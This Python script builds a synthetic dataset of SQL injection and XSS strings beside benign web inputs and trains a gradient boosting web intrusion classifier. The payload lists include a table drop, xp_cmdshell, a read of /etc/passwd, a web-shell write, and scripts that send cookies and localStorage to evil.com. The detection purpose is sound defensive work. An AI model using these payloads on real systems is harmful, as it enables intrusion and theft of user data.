import pandas as pd
import numpy as np
import os
import joblib
import random
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.pipeline import FeatureUnion
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.model_selection import train_test_split, StratifiedKFold, cross_val_score
from sklearn.metrics import classification_report, precision_recall_curve, confusion_matrix, ConfusionMatrixDisplay

# ===============================
# 1. สร้าง dataset (100,000+ ตัวอย่าง)
# ===============================
def generate_dataset(n_samples=100000):
    payloads = []
    labels = []
    
    # ------------------
    # Data Components
    # ------------------
    tables = ["users", "admin", "students", "products", "orders", "customers", "auth", "session", "logs", "items", "cart"]
    cols = ["id", "username", "password", "email", "status", "role", "token", "hash", "salt", "first_name", "last_name", "price"]
    words = ["hello", "world", "test", "data", "query", "user", "admin", "system", "search", "update", "delete", "create", "read"]
    endpoints = ["/index.html", "/api/login", "/about", "/contact", "/dashboard", "/products/1", "/user/profile", "/checkout", "/api/v1/users", "/search"]
    
    for _ in range(n_samples // 2):
        # ==========================================
        # Generate Attack (SQLi & XSS)
        # ==========================================
        attack_type = random.choice(["sqli", "xss"])
        if attack_type == "sqli":
            t = random.choice(tables)
            c = random.choice(cols)
            w = random.choice(words)
            sqli_patterns = [
                # Classic bypasses
                f"'{' '*random.randint(0,2)}OR{' '*random.randint(1,3)}1=1--",
                f"\"{' '*random.randint(0,2)}OR{' '*random.randint(1,3)}\"\"=\"",
                f"') OR ('1'='1",
                f"admin' --",
                f"admin' #",
                f"admin'/*",
                
                # UNION-based
                f"' UNION SELECT null, username, password FROM {t}--",
                f"UNION ALL SELECT null,null,null--",
                f"' UNION SELECT 1,2,3,4,5--",
                f"' UNION SELECT @@version, user(), database()--",
                
                # Blind / Time-based
                f"' AND 1=1--",
                f"' AND 1=2--",
                f"' AND sleep(5)--",
                f"' AND SLEEP({random.randint(1,10)})--",
                f"admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                f"' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
                
                # Error-based
                f"' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",
                f"' AND UPDATEXML(1, CONCAT(0x5c, (SELECT database())), 1)--",
                f"CONVERT(int, (SELECT @@version))",
                
                # Stacked queries
                f"1; DROP TABLE {t}--",
                f"1; UPDATE {t} SET {c}='{w}'--",
                f"'; EXEC xp_cmdshell('dir')--",
                
                # Encoded & Obfuscated
                f"%27 OR 1=1--",
                f"%27%20OR%201%3D1--",
                f"SeLeCt * FrOm {t}",
                f"/*!50000SELECT*/ * FROM {t}",
                f"SELECT CHAR(116)+CHAR(101)+CHAR(115)+CHAR(116)",
                f"'{'%09'}OR{'%0a'}1=1--",
                
                # Out-of-band / File access
                f"SELECT load_file('/etc/passwd')",
                f"' INTO OUTFILE '/var/www/html/shell.php'--",
                
                # Contextual
                f"SELECT * FROM {t}",
                f"SELECT {c} FROM {t} WHERE {c}='{w}'",
                f"SELECT * FROM information_schema.tables",
                f"' OR {c} IS NOT NULL--"
            ]
            payloads.append(random.choice(sqli_patterns))
        else:
            w = random.choice(words)
            xss_patterns = [
                # Basic script
                f"<script>alert(1)</script>",
                f"<script>alert('{w}')</script>",
                f"<script src='http://evil.com/xss.js'></script>",
                
                # Event handlers
                f"<img src=x onerror=alert(1)>",
                f"<img src='invalid_image.jpg' onerror=\"alert('xss')\">",
                f"<svg onload=alert(1)>",
                f"<body onload=alert('{w}')>",
                f"<input onfocus=alert(1) autofocus>",
                f"<div onmouseover=alert(1)>{w}</div>",
                f"<details open ontoggle=alert(1)>",
                f"<marquee onstart=alert(1)>",
                f"<button onclick=alert(1)>{w}</button>",
                f"<video><source onerror='javascript:alert(1)'></video>",
                
                # URI handlers
                f"javascript:alert(1)",
                f"javascript:alert('{w}')",
                f"<a href=\"javascript:alert('xss')\">{w}</a>",
                f"<iframe src=javascript:alert(1)>",
                f"<object data=javascript:alert(1)>",
                f"<embed src=javascript:alert(1)>",
                f"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                
                # DOM-based & Cookie theft
                f"'\"><script>alert(document.cookie)</script>",
                f"<script>document.location='http://evil.com?c='+document.cookie</script>",
                f"<script>fetch('http://evil.com?data='+localStorage)</script>",
                f"<script>window.location='http://evil.com'</script>",
                
                # Obfuscated / Encoded
                f"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                f"%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                f"jaVasCript:/*-/*`/*\`/*'/*\"/**/(/**/oNcliCk=alert())//%0D%0A",
                f"<scr\x00ipt>alert(1)</script>",
                
                # Frameworks / Template injection
                f"{{{{constructor.constructor('alert(1)')()}}}}",
                f"${{7*7}}",
                
                # Mutation XSS
                f"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
            ]
            payloads.append(random.choice(xss_patterns))
        labels.append("Attack")
        
        # ==========================================
        # Generate Normal
        # ==========================================
        normal_type = random.choice(["text", "url", "param", "json", "natural", "edge_case"])
        w1 = random.choice(words)
        w2 = random.choice(words)
        ep = random.choice(endpoints)
        
        if normal_type == "text":
            normal_patterns = [
                f"{w1} {w2} request",
                f"hello {w1}",
                f"{w1} profile update",
                f"search query {w2}",
                f"This is a normal sentence containing {w1} and {w2}."
            ]
            payloads.append(random.choice(normal_patterns))
        elif normal_type == "url":
            normal_patterns = [
                f"GET {ep} HTTP/1.1",
                f"POST {ep} HTTP/1.1",
                f"PUT {ep} HTTP/1.1",
                f"DELETE {ep} HTTP/1.1"
            ]
            payloads.append(random.choice(normal_patterns))
        elif normal_type == "json":
            normal_patterns = [
                f'{{"username":"{w1}","password":"{w2}"}}',
                f'{{"query":"{w1}","filters":{{"category":"{w2}"}}}}',
                f'[{{"id":{random.randint(1,100)}}}, {{"id":{random.randint(101,200)}}}]'
            ]
            payloads.append(random.choice(normal_patterns))
        elif normal_type == "natural":
            normal_patterns = [
                f"ฉันต้องการค้นหาข้อมูลเกี่ยวกับ {w1}",
                f"Please update my account settings.",
                f"What is the price of {w1}?",
                f"Contact support regarding order #{random.randint(1000,9999)}"
            ]
            payloads.append(random.choice(normal_patterns))
        elif normal_type == "edge_case":
            # Edge cases that look like attacks but are benign
            normal_patterns = [
                f"O'Brien", # Single quote
                f"D'Arcy",
                f"5 > 3", # Greater than (looks like tag)
                f"Math equation: x < y",
                f"SELECT a shirt from the catalog", # Uses SQL keyword
                f"UNION of two sets",
                f"Let's drop the table by the window",
                f"script for the school play", # Uses XSS keyword
                f"alert me when the price drops",
                f"100% discount--today only!" # Has SQL comment
            ]
            payloads.append(random.choice(normal_patterns))
        else:
            normal_patterns = [
                f"POST /api/login username={w1}&password=1234",
                f"product id={random.randint(1,1000)}",
                f"user id={random.randint(1,1000)} action=view",
                f"search keyword={w1}",
                f"page={random.randint(1,10)}&limit=10",
                f"filter=price&sort=asc",
                f"category={w1}&brand={w2}",
                f"username={w1}&email={w1}@example.com",
                f"lang=th&theme=dark",
                f"{ep}?q={w1}&ref=google"
            ]
            payloads.append(random.choice(normal_patterns))
        labels.append("Normal")

    # Shuffle dataset
    df = pd.DataFrame({"payload": payloads, "label": labels})
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    return df

print("Generating dataset...")
df = generate_dataset(100000)

print(f"Dataset size : {len(df)} samples")
print(f"Attack       : {len(df[df['label']=='Attack'])}")
print(f"Normal       : {len(df[df['label']=='Normal'])}")
print()

# ===============================
# 2. แปลงข้อความเป็นตัวเลข (Dual Vectorizer)
# ===============================
print("Extracting features (Word + Char n-grams)...")
# Word-level TF-IDF
word_vectorizer = TfidfVectorizer(
    ngram_range=(1, 3),
    max_features=10000,
    analyzer='word',
    sublinear_tf=True
)

# Character-level TF-IDF
char_vectorizer = TfidfVectorizer(
    ngram_range=(2, 5),
    max_features=15000,
    analyzer='char_wb',
    sublinear_tf=True
)

# Combine both
vectorizer = FeatureUnion([
    ('word', word_vectorizer),
    ('char', char_vectorizer),
])

X = vectorizer.fit_transform(df["payload"])
y = df["label"]

# ===============================
# 3. แบ่ง train/test
# ===============================
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

# ===============================
# 4. เทรนโมเดล (Gradient Boosting)
# ===============================
print("Training Gradient Boosting model (this may take a few minutes)...")
model = GradientBoostingClassifier(
    n_estimators=300,
    max_depth=6,
    learning_rate=0.1,
    subsample=0.8,
    min_samples_split=10,
    min_samples_leaf=5,
    max_features='sqrt',
    random_state=42,
    verbose=1
)
model.fit(X_train, y_train)

# ===============================
# 5. ทดสอบโมเดล & หา Threshold ที่เหมาะสม
# ===============================
print("\nEvaluating model...")
classes = list(model.classes_)
attack_index = classes.index("Attack")
y_prob = model.predict_proba(X_test)[:, attack_index]

# หา Threshold ที่ดีที่สุดจาก Precision-Recall Curve
precisions, recalls, thresholds = precision_recall_curve(
    y_test == "Attack", y_prob
)
# ป้องกันการหารด้วยศูนย์
f1_scores = 2 * (precisions * recalls) / (precisions + recalls + 1e-8)
optimal_idx = np.argmax(f1_scores)
# thresholds array length is len(precisions) - 1
if optimal_idx < len(thresholds):
    THRESHOLD = float(thresholds[optimal_idx])
else:
    THRESHOLD = 0.5 # fallback

# ถ้าต้องการให้น้ำหนักกับ Attack (ลด False Negative) ให้ปรับ threshold ลงเล็กน้อยจาก optimal
THRESHOLD = max(0.1, THRESHOLD * 0.8)

y_pred = np.where(y_prob >= THRESHOLD, "Attack", "Normal")

print(f"\n=== Model Evaluation (Optimal Threshold = {THRESHOLD:.4f}) ===")
print(classification_report(y_test, y_pred))

# ===============================
# 6. บันทึกไฟล์โมเดล & รูปภาพ
# ===============================
if not os.path.exists("models"):
    os.makedirs("models")

# สร้าง Confusion Matrix
cm = confusion_matrix(y_test, y_pred, labels=["Attack", "Normal"])
disp = ConfusionMatrixDisplay(cm, display_labels=["Attack", "Normal"])
disp.plot(cmap='Blues')
plt.title("Web IDS - Confusion Matrix")
plt.savefig("models/confusion_matrix.png", dpi=150, bbox_inches='tight')
print("\nConfusion matrix saved to models/confusion_matrix.png")

joblib.dump(model, "models/model.pkl")
joblib.dump(vectorizer, "models/vectorizer.pkl")
joblib.dump(THRESHOLD, "models/threshold.pkl")

print("Model, vectorizer and threshold saved successfully.")

# ===============================
# 7. ทดสอบกับ Edge Cases ทันที
# ===============================
print("\n=== Edge Case Testing ===")
test_cases = [
    ("O'Brien", "Normal"),
    ("SELECT a shirt from the catalog", "Normal"),
    ("admin' OR '1'='1", "Attack"),
    ("<script>alert(1)</script>", "Attack"),
    ("Buy 5 > 3 items", "Normal")
]

for payload, expected in test_cases:
    x_test_case = vectorizer.transform([payload])
    prob = model.predict_proba(x_test_case)[0][attack_index]
    pred = "Attack" if prob >= THRESHOLD else "Normal"
    status = "✅ PASS" if pred == expected else "❌ FAIL"
    print(f"[{status}] Payload: '{payload}' -> Pred: {pred} (Prob: {prob:.4f}, Expected: {expected})")